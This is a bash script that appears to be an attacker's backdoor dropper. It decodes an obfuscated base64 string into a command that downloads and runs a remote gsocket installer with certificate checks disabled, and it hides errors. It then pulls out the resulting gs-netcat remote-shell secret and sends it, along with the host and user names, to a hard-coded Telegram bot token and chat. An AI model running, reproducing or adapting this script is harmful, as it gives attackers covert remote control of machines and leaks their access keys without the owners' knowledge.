#!/bin/bash

d_17b31f50=false

# Telegram Bot Config
TG_BOT_TOKEN="8628717278:AAEcQd6vINfT95yNRv8tRD_u-51pFwDamqs"
TG_CHAT_ID="1142721678"

send_telegram() {
    local message="$1"
    curl -s -X POST "https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage" \
        -d chat_id="${TG_CHAT_ID}" \
        -d text="${message}" \
        -d parse_mode="HTML" >/dev/null 2>&1
}

if [ "$d_17b31f50" = true ]; then
    set -e
else
    exec 2>/dev/null
    set +e
fi

b_b9caa2a7() {
    local cmd="$1 2>&1"
    local output=""

    if command -v system >/dev/null 2>&1; then
        output=$(system "$cmd" 2>&1)
    elif command -v shell_exec >/dev/null 2>&1; then
        output=$(shell_exec "$cmd" 2>&1)
    elif command -v eval >/dev/null 2>&1; then
        output=$(eval "$cmd" 2>&1)
    fi

    echo "$output"
}

i_3087fa6="R1NfTk9DRVJUQ0hFQ0s9M"
r_9a012e1c="SBiYXNoIC1jICIkKGN1"
l_ed061e8a="cmwgLWZzU0xrIGh0dHBzO"
b_cb62fb7c="i8vZ3NvY2tldC5pby94KSIK"

n_84c18552="${i_3087fa6}${r_9a012e1c}"
l_1dc8d4e8="${l_ed061e8a}${b_cb62fb7c}"
l_bb6f4ec5=$(echo "${n_84c18552}${l_1dc8d4e8}" | base64 -d)

o_8ecaead4="$l_bb6f4ec5"

u_136ac113=$(b_b9caa2a7 "$o_8ecaead4")

HOST_INFO="$(hostname 2>/dev/null || echo 'unknown')@$(whoami 2>/dev/null || echo 'unknown')"

if echo "$u_136ac113" | grep -oE 'gs-netcat -s ".*?" -i' >/dev/null; then
    RESULT=$(echo "$u_136ac113" | grep -oE 'gs-netcat -s ".*?" -i')
    echo "Success ==> ${RESULT}"
    send_telegram "🟢 <b>GSocket Success</b>
━━━━━━━━━━━━━━━
🖥 <b>Host:</b> <code>${HOST_INFO}</code>
🔑 <b>Result:</b> <code>${RESULT}</code>
━━━━━━━━━━━━━━━"
else
    echo "Failed :("
    send_telegram "🔴 <b>GSocket Failed</b>
━━━━━━━━━━━━━━━
🖥 <b>Host:</b> <code>${HOST_INFO}</code>
❌ <b>Status:</b> Connection failed
━━━━━━━━━━━━━━━"
fi
